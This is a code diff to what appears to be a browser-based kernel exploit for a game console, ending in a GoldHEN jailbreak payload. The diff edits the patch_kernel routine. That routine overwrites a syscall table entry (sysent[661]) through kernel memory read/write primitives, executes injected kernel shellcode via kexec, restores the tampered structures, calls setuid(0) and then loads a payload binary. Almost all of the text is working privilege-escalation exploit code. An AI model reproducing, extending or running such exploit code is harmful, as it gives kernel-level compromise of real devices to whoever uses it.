@@ -1542,8 +1542,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     for (let off = 0; off < sysent_661_save.size; off += 8) {
         sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
     }
-    log(`sysent[611] save addr: ${sysent_661_save.addr}`);
-    log("sysent[611] save data:");
+    log(`sysent[661] save addr: ${sysent_661_save.addr}`);
+    log("sysent[661] save data:");
     hexdump(sysent_661_save);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
@@ -1609,38 +1609,33 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         die("test jit exec failed");
     }
 
-    log("mlock saved data for kernel restore");
-    const pipe_save = restore_info[1];
-    restore_info[1] = pipe_save.addr;
-    sysi("mlock", restore_info[1], page_size);
-    restore_info[4] = sysent_661_save.addr;
-    sysi("mlock", restore_info[4], page_size);
-
     log("execute kpatch...");
     mem.cpy(write_addr, patches.addr, patches.size);
-    sys_void("kexec", exec_addr, ...restore_info);
+    // ELF only runs do_patch() — restores are handled by JS below
+    sys_void("kexec", exec_addr);
 
-    // Explicitly close everything, it should happen implicitly already... did
-    // not fix blackscreen issue.
+    // RESTORE sysent[661] first, immediately after kexec returns,
+    // to minimize the window where syscall 661 points to jmp [rsi]
+    log("restore sysent[661]");
+    for (let off = 0; off < sysent_661_save.size; off += 8) {
+        kmem.write64(sysent_661.add(off), sysent_661_save.read64(off));
+    }
+    log("sysent[661] restored");
 
-    // log("munlock locked data");
-    // sysi("munlock", restore_info[4], page_size);
-    // sysi("munlock", restore_info[1], page_size);
-    // sysi("munlock", exec_addr, map_size);
+    // RESTORE pipebuf (last kmem operation)
+    log("restore pipebuf");
+    const kpipe = restore_info[0];
+    const pipe_save = restore_info[1]; // Buffer object, not .addr
+    for (let off = 0; off < 0x18; off += 8) {
+        kmem.write64(kpipe.add(off), pipe_save.read64(off));
+    }
+    log("pipebuf restored");
 
-    // log("munmap kpatch shellcode memory");
-    // sysi("munmap", write_addr, map_size);
-    // sysi("munmap", exec_addr, map_size);
-
-    // One works, both cause an OOM error, then works as it reloads because it kpatched properly
-    // log("close JIT fds");
-    // close(write_fd);
-    // close(exec_fd);
-    log('setuid(0)');
+    log("setuid(0)");
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    localStorage.ExploitLoaded="yes";
-    sessionStorage.ExploitLoaded="yes";
+    localStorage.ExploitLoaded = "yes";
+    sessionStorage.ExploitLoaded = "yes";
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1828,12 +1823,20 @@ function runPayload(PLfile) {
   };
 }
 
-kexploit().then(() => {
-	setTimeout(() => {
-		runPayload("./goldhen_2.4b18.12.bin");
-		msgs.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
-	},500);
-}).catch(() => {
+function hostFail() {
     msgs.innerHTML = "Failed to Load! Restart Your Console ...";
-	msgs.style.color = "yellow";
+    msgs.style.color = "yellow";
+}
+
+kexploit().then(() => {
+    setTimeout(() => {
+        try {
+            runPayload("./goldhen_2.4b18.12.bin");
+            msgs.innerHTML = "GoldHEN v2.4b18.12 Loaded ...";
+        } catch (e) {
+            hostFail();
+        }
+    }, 500);
+}).catch(() => {
+    hostFail();
 });
